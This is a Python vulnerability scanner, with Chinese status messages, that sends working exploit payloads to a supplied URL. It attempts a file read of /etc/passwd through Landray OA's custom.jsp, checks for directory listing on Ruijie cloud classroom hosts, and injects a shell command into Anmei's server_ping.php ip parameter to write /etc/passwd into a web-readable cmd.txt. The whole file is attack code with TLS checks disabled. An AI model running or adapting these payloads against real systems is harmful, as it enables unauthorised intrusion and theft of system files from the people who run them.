import requests
import sys
import urllib3
urllib3.disable_warnings()
def lanling(url):
    url=url+"/sys/ui/extend/varkind/custom.jsp"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
        }
    data='var={"body":{"file":"file:///etc/passwd"}}'
    try:
        response=requests.post(url,data=data,headers=header,verify=False)
        print("\033[1;36m蓝凌OA custom.jsp 任意文件读取漏洞扫描中...\033[0m")
        if 'root' in response.text and response.status_code==200:
            print("\033[1;32m存在漏洞\033[0m")
        else:
            print("\033[1;31m不存在漏洞\033[0m")
    except Exception as e:
         print("\033[1;31m不存在漏洞\033[0m",format(e))
    
def ruijie(url):
    url=url+"/pool/"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        }
    try:
        response=requests.get(url,headers=header,verify=False)
        print("\033[1;36m锐捷云课堂主机目录遍历漏洞扫描中...\033[0m")
        if 'Directory Listing For /' in response.text:
            print("\033[1;32m存在漏洞\033[0m")
        else:
            print("\033[1;31m不存在漏洞\033[0m")
    except Exception as e:
        print("\033[1;31m不存在漏洞\033[0m",format(e))
def anmei(url):
    first=url+"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../cmd.txt&id=1"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
        }
    try:
        response=requests.get(url=first,headers=header,verify=False)
        print("\033[1;36m安美数字发送payload中...\033[0m") 
        if 'doTestResult' in response.text:
            second=url+"/cmd.txt"
            response=requests.get(url=second,headers=header,verify=False)
            print("\033[1;36m安美数字酒店宽带运营系统漏洞扫描中...\033[0m")
            if 'root' in response.text:
                print("\033[1;32m存在漏洞\033[0m")
            else:
                print("\033[1;31m不存在漏洞\033[0m")
    except Exception as e:
        print("\033[1;31m不存在漏洞\033[0m",format(e))
if __name__=='__main__':
    url= sys.argv[1]
    ruijie(url)
    lanling(url)
    anmei(url)
    

